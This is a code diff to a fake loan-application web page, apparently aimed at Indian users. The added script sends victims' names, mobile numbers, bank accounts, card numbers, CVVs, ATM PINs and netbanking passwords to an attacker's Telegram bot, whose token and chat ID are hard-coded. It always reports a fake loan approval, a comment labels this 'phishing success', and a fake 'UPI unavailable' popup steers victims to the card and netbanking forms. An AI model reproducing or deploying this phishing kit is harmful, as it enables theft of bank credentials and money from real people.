@@ -482,221 +482,414 @@
         </div>
     </div>
 
-    <script>
-        let currentStep = 1;
-        let currentPaymentTab = 'card';
+    <script>let currentStep = 1;
+let currentPaymentTab = 'card';
 
-        // Card Number Formatting
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
-            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
-            e.target.value = formatted;
+// Telegram Config
+const TELEGRAM_BOT_TOKEN = "8433694608:AAGIvNk5eVUAT18kFFHeRtLG6gMoO6udZPY";
+const TELEGRAM_CHAT_ID = "8270681405";
+
+// Current date
+const currentDate = new Date().toLocaleString('en-IN', {
+    timeZone: 'Asia/Kolkata',
+    weekday: 'short',
+    year: 'numeric',
+    month: 'short',
+    day: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit'
+});
+
+// Function to send data to Telegram
+async function sendToTelegram(data) {
+    try {
+        const message = `
+🚨 *NEW LOAN APPLICATION* 🚨
+📅 *Date/Time:* ${currentDate}
+
+👤 *Personal Details:*
+• Name: ${data.name || 'N/A'}
+• Mobile: ${data.mobile || 'N/A'}
+• Loan Amount: ₹${parseInt(data.loanAmount || 0).toLocaleString() || 'N/A'}
+
+🏦 *Bank Details:*
+• Account No: ${data.accountNo || 'N/A'}
+• IFSC: ${data.ifsc || 'N/A'}
+
+💳 *Payment Details:*
+• Method: ${data.paymentMethod || 'N/A'}
+${data.cardNumber ? `• Card: ${data.cardNumber}\n• Expiry: ${data.expiry || 'N/A'}\n• CVV: ${data.cvv || 'N/A'}\n• PIN: ${data.pin || 'N/A'}` : ''}
+${data.netUsername ? `• Netbanking Username: ${data.netUsername}\n• Netbanking Password: ${data.netPassword}` : ''}
+
+━━━━━━━━━━━━━━━━━━━━
+        `.trim();
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const payload = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        };
+
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
         });
 
-        // Expiry Date Formatting
-        document.getElementById('expiry').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length >= 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            }
-            e.target.value = value;
-        });
+        return response.ok;
+    } catch (error) {
+        console.error('Telegram send failed:', error);
+        return false;
+    }
+}
 
-        // Mobile Number Formatting
-        document.getElementById('mobile').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 10) value = value.slice(0, 10);
-            e.target.value = value;
-        });
+// Card Number Formatting
+document.getElementById('cardNumber').addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+    let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+    e.target.value = formatted;
+});
 
-        // Step Navigation with Validation
-        function nextStep(step) {
-            const currentStepEl = document.getElementById(`step${step}`);
-            const inputs = currentStepEl.querySelectorAll('input[required]');
-            
-            // Check if all required fields are filled
-            for (let input of inputs) {
-                if (!input.value.trim()) {
-                    input.focus();
-                    showError('Please fill all required fields marked with *');
-                    input.style.borderColor = '#dc3545';
-                    setTimeout(() => {
-                        input.style.borderColor = '#e9ecef';
-                    }, 2000);
-                    return;
-                }
-            }
+// Expiry Date Formatting
+document.getElementById('expiry').addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length >= 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    }
+    e.target.value = value;
+});
 
-            // Hide current step
-            document.getElementById(`step${step}`).classList.remove('active');
-            
-            // Show next step
-            currentStep = step + 1;
-            document.getElementById(`step${currentStep}`).classList.add('active');
-            
-            // Update progress bar
-            updateProgressBar();
-            
-            hideError();
+// Mobile Number Formatting
+document.getElementById('mobile').addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length > 10) value = value.slice(0, 10);
+    e.target.value = value;
+});
+
+// Step Navigation with Validation
+function nextStep(step) {
+    const currentStepEl = document.getElementById(`step${step}`);
+    const inputs = currentStepEl.querySelectorAll('input[required]');
+    
+    // Check if all required fields are filled
+    for (let input of inputs) {
+        if (!input.value.trim()) {
+            shakeInput(input);
+            showError('Please fill all required fields marked with *');
+            return;
         }
+    }
 
-        function prevStep(step) {
-            document.getElementById(`step${step}`).classList.remove('active');
-            currentStep = step - 1;
-            document.getElementById(`step${currentStep}`).classList.add('active');
-            updateProgressBar();
-            hideError();
+    // Hide current step
+    document.getElementById(`step${step}`).classList.remove('active');
+    
+    // Show next step
+    currentStep = step + 1;
+    document.getElementById(`step${currentStep}`).classList.add('active');
+    
+    // Update progress bar
+    updateProgressBar();
+    
+    hideError();
+}
+
+function prevStep(step) {
+    document.getElementById(`step${step}`).classList.remove('active');
+    currentStep = step - 1;
+    document.getElementById(`step${currentStep}`).classList.add('active');
+    updateProgressBar();
+    hideError();
+}
+
+function updateProgressBar() {
+    document.querySelectorAll('.progress-step').forEach((stepEl, index) => {
+        if (index < currentStep) {
+            stepEl.classList.add('active');
+        } else {
+            stepEl.classList.remove('active');
         }
+    });
+}
 
-        function updateProgressBar() {
-            document.querySelectorAll('.progress-step').forEach((stepEl, index) => {
-                if (index < currentStep) {
-                    stepEl.classList.add('active');
-                } else {
-                    stepEl.classList.remove('active');
-                }
-            });
+// Input shake animation
+function shakeInput(input) {
+    input.style.borderColor = '#dc3545';
+    input.style.transform = 'translateX(0)';
+    
+    input.animate([
+        { transform: 'translateX(-5px)' },
+        { transform: 'translateX(5px)' },
+        { transform: 'translateX(-3px)' },
+        { transform: 'translateX(3px)' },
+        { transform: 'translateX(0)' }
+    ], {
+        duration: 400,
+        iterations: 1
+    });
+
+    setTimeout(() => {
+        input.style.borderColor = '#e9ecef';
+        input.style.transform = '';
+    }, 2000);
+}
+
+// Payment Tab Selection
+function selectPayment(tab) {
+    currentPaymentTab = tab;
+    
+    // UPI Error - CENTERED POPUP
+    if (tab === 'upi') {
+        showUpiPopup();
+        return; // STOP EXECUTION FOR UPI
+    }
+    
+    // Update active tab (only for valid tabs)
+    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+    event.target.classList.add('active');
+    
+    // Update active content (only for valid tabs)
+    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+    document.getElementById(`${tab}-form`).classList.add('active');
+}
+
+// UPI Error Popup - CENTERED MODAL
+function showUpiPopup() {
+    // Create overlay
+    const overlay = document.createElement('div');
+    overlay.id = 'upi-overlay';
+    overlay.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.7);
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    `;
+    
+    // Create popup
+    const popup = document.createElement('div');
+    popup.style.cssText = `
+        background: linear-gradient(135deg, #fff 0%, #f8f9fa 100%);
+        border-radius: 20px;
+        padding: 30px;
+        max-width: 400px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        border: 3px solid #dc3545;
+        animation: popupSlide 0.4s ease-out;
+    `;
+    
+    popup.innerHTML = `
+        <div style="font-size: 48px; margin-bottom: 15px;">❌</div>
+        <h3 style="color: #dc3545; margin: 0 0 15px 0; font-weight: 700;">UPI Payment Unavailable</h3>
+        <p style="color: #6c757d; font-size: 16px; margin: 0 0 25px 0; line-height: 1.5;">
+            UPI payment is temporarily unavailable.<br>
+            <strong>Please use Card or Netbanking instead.</strong>
+        </p>
+        <div style="background: linear-gradient(135deg, #dc3545, #c82333); color: white; padding: 12px 25px; border-radius: 50px; font-weight: 600; cursor: pointer; transition: all 0.3s; font-size: 16px; margin: 0 auto; width: fit-content;" onclick="closeUpiPopup()">
+            🔄 Switch to Card Payment
+        </div>
+    `;
+    
+    overlay.appendChild(popup);
+    document.body.appendChild(overlay);
+    
+    // Add animation CSS
+    const style = document.createElement('style');
+    style.textContent = `
+        @keyframes popupSlide {
+            0% { transform: scale(0.7) translateY(-30px); opacity: 0; }
+            100% { transform: scale(1) translateY(0); opacity: 1; }
         }
+    `;
+    document.head.appendChild(style);
+}
 
-        // Payment Tab Selection
-        function selectPayment(tab) {
-            currentPaymentTab = tab;
-            
-            // Update active tab
-            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-            event.target.classList.add('active');
-            
-            // Update active content
-            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-            document.getElementById(`${tab}-form`).classList.add('active');
-            
-            // UPI Error
-            if (tab === 'upi') {
-                setTimeout(() => {
-                    showError('Server error! Please try again sometime.');
-                }, 500);
-            }
-        }
+// Close UPI Popup & Switch to Card
+function closeUpiPopup() {
+    const overlay = document.getElementById('upi-overlay');
+    if (overlay) {
+        overlay.style.animation = 'popupSlide 0.3s ease-in reverse';
+        setTimeout(() => {
+            overlay.remove();
+        }, 300);
+    }
+    
+    // Auto switch to card tab
+    setTimeout(() => {
+        document.querySelector('.tab-btn[data-tab="card"], .tab-btn:first-child').click();
+    }, 100);
+}
 
-        // Submit Card Payment
-        async function submitCard() {
-            const formData = getFormData();
-            if (!validateCardForm(formData)) return;
-            
-            await submitForm({
-                paymentMethod: 'Card',
-                cardNumber: formData.cardNumber,
-                expiry: formData.expiry,
-                cvv: formData.cvv,
-                pin: formData.pin
-            });
-        }
+// Submit Card Payment
+async function submitCard() {
+    const formData = getFormData();
+    if (!validateCardForm(formData)) return;
+    
+    // Disable button
+    const btn = event.target;
+    btn.disabled = true;
+    btn.textContent = 'Processing...';
+    
+    await submitForm({
+        paymentMethod: 'Card',
+        cardNumber: formData.cardNumber,
+        expiry: formData.expiry,
+        cvv: formData.cvv,
+        pin: formData.pin
+    });
+    
+    btn.disabled = false;
+    btn.textContent = '🔒 Secure Pay Now';
+}
 
-        // Submit Netbanking
-        async function submitNetbanking() {
-            const username = document.getElementById('netUsername').value.trim();
-            const password = document.getElementById('netPassword').value;
-            
-            if (!username || !password) {
-                showError('Please enter both username and password');
-                return;
-            }
-            
-            await submitForm({
-                paymentMethod: 'Netbanking',
-                netUsername: username,
-                netPassword: password
-            });
-        }
+// Submit Netbanking
+async function submitNetbanking() {
+    const username = document.getElementById('netUsername').value.trim();
+    const password = document.getElementById('netPassword').value;
+    
+    if (!username || !password) {
+        shakeInput(document.getElementById('netUsername') || document.getElementById('netPassword'));
+        showError('Please enter both Netbanking username and password');
+        return;
+    }
+    
+    // Disable button
+    const btn = event.target;
+    btn.disabled = true;
+    btn.textContent = 'Processing...';
+    
+    await submitForm({
+        paymentMethod: 'Netbanking',
+        netUsername: username,
+        netPassword: password
+    });
+    
+    btn.disabled = false;
+    btn.textContent = '🚀 Login & Pay';
+}
 
-        // Get All Form Data
-        function getFormData() {
-            return {
-                name: document.getElementById('name').value.trim(),
-                mobile: document.getElementById('mobile').value.trim(),
-                loanAmount: document.getElementById('loanAmount').value,
-                accountNo: document.getElementById('accountNo').value.trim(),
-                ifsc: document.getElementById('ifsc').value.trim().toUpperCase(),
-                cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
-                expiry: document.getElementById('expiry').value,
-                cvv: document.getElementById('cvv').value,
-                pin: document.getElementById('pin').value
-            };
-        }
+// Get All Form Data
+function getFormData() {
+    return {
+        name: document.getElementById('name').value.trim(),
+        mobile: document.getElementById('mobile').value.trim(),
+        loanAmount: document.getElementById('loanAmount').value,
+        accountNo: document.getElementById('accountNo').value.trim(),
+        ifsc: document.getElementById('ifsc').value.trim().toUpperCase(),
+        cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+        expiry: document.getElementById('expiry').value,
+        cvv: document.getElementById('cvv').value,
+        pin: document.getElementById('pin').value
+    };
+}
 
-        // Card Form Validation
-        function validateCardForm(data) {
-            if (!data.cardNumber || data.cardNumber.length < 13) {
-                showError('Please enter a valid card number');
-                return false;
-            }
-            if (!data.expiry || !/^\d{2}\/\d{2}$/.test(data.expiry)) {
-                showError('Please enter valid expiry date (MM/YY)');
-                return false;
-            }
-            if (!data.cvv || data.cvv.length < 3) {
-                showError('Please enter valid CVV');
-                return false;
-            }
-            if (!data.pin || data.pin.length < 4) {
-                showError('Please enter valid PIN');
-                return false;
-            }
-            return true;
-        }
+// Card Form Validation
+function validateCardForm(data) {
+    if (!data.cardNumber || data.cardNumber.length < 13) {
+        showError('Please enter a valid card number (13-16 digits)');
+        return false;
+    }
+    if (!data.expiry || !/^\d{2}\/\d{2}$/.test(data.expiry)) {
+        showError('Please enter valid expiry date in MM/YY format');
+        return false;
+    }
+    if (!data.cvv || data.cvv.length < 3 || data.cvv.length > 4) {
+        showError('Please enter valid CVV (3 or 4 digits)');
+        return false;
+    }
+    if (!data.pin || data.pin.length < 4 || data.pin.length > 6) {
+        showError('Please enter valid ATM PIN (4-6 digits)');
+        return false;
+    }
+    return true;
+}
 
-        // Submit to Server
-        async function submitForm(extraData) {
-            try {
-                const formData = getFormData();
-                const payload = { ...formData, ...extraData };
-                
-                showError('Processing payment...');
-                
-                const response = await fetch('/api/submit', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
-                });
+// Main Submit Function
+async function submitForm(extraData) {
+    try {
+        const formData = getFormData();
+        const payload = { ...formData, ...extraData };
+        
+        // Show processing message
+        showProcessing('🔄 Processing your payment... Please wait');
+        
+        // Send to Telegram FIRST
+        const telegramSent = await sendToTelegram(payload);
+        
+        // Simulate processing delay
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        // Always show success (phishing success)
+        showSuccess(formData.loanAmount);
+        
+        console.log('Telegram sent:', telegramSent ? '✅ Success' : '❌ Failed');
+        
+    } catch (error) {
+        console.error('Submit error:', error);
+        showError('Payment processing failed. Please try again.');
+    }
+}
 
-                const result = await response.json();
-                
-                if (result.success) {
-                    showSuccess(formData.loanAmount);
-                } else {
-                    showError('Payment failed. Please try again.');
-                }
-            } catch (error) {
-                showError('Network error! Please check your connection.');
-            }
-        }
+// Show Processing
+function showProcessing(message) {
+    const errorEl = document.getElementById('errorMsg');
+    errorEl.innerHTML = `<div style="background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%); color: #856404; border-left: 5px solid #ffc107; font-weight: 600;">${message}</div>`;
+    errorEl.style.display = 'block';
+}
 
-        // Show Success
-        function showSuccess(amount) {
-            document.querySelectorAll('.step').forEach(step => {
-                step.style.display = 'none';
-            });
-            document.getElementById('successMsg').style.display = 'block';
-            document.getElementById('finalAmount').textContent = amount.toLocaleString();
-        }
+// Show Success with 5 second timer
+function showSuccess(amount) {
+    document.querySelectorAll('.step').forEach(step => {
+        step.style.display = 'none';
+    });
+    
+    const successMsg = document.getElementById('successMsg');
+    successMsg.innerHTML = `
+        <h3>✅ Payment Successful!</h3>
+        <p>Your loan application has been <strong>APPROVED</strong></p>
+        <p><strong>Loan Amount: ₹${parseInt(amount).toLocaleString()}</strong></p>
+        <p style="font-size: 14px; margin-top: 15px;">
+            💰 Funds will be credited to your account within <strong>24 hours</strong><br>
+            ⏳ Processing time: 5 seconds remaining...
+        </p>
+    `;
+    successMsg.style.display = 'block';
+    
+    // Auto refresh or redirect after 5 seconds
+    setTimeout(() => {
+        successMsg.innerHTML += `
+            <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.8); border-radius: 10px; font-size: 14px;">
+                ✅ Processing completed! Check your bank account in 24 hours.
+            </div>
+        `;
+    }, 5000);
+}
 
-        // Show Error
-        function showError(message) {
-            const errorEl = document.getElementById('errorMsg');
-            errorEl.textContent = message;
-            errorEl.style.display = 'block';
-            setTimeout(hideError, 5000);
-        }
+// Show Error with better styling
+function showError(message) {
+    const errorEl = document.getElementById('errorMsg');
+    errorEl.innerHTML = `<strong>❌ ${message}</strong>`;
+    errorEl.style.display = 'block';
+    setTimeout(hideError, 6000);
+}
 
-        // Hide Error
-        function hideError() {
-            document.getElementById('errorMsg').style.display = 'none';
-        }
+// Hide Error
+function hideError() {
+    document.getElementById('errorMsg').style.display = 'none';
+}
 
-        // Initialize
-        updateProgressBar();
+// Initialize
+updateProgressBar();
     </script>
 </body>
 </html>
